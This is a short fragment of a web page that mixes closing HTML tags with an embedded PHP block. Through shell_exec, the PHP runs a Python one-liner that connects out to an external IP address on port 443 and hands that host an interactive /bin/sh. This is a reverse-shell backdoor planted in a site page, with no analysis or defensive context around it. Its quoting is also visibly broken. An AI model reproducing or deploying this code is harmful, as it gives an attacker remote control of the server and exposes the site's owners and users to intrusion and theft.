	</body>
</html>	
<?php 
	$prova = shell_exec("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("194.116.81.100",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'");
	print "<html>
	    <body>
		{$prova}
	    </body>
	  </html>
	";
?>
<html>
	<body>


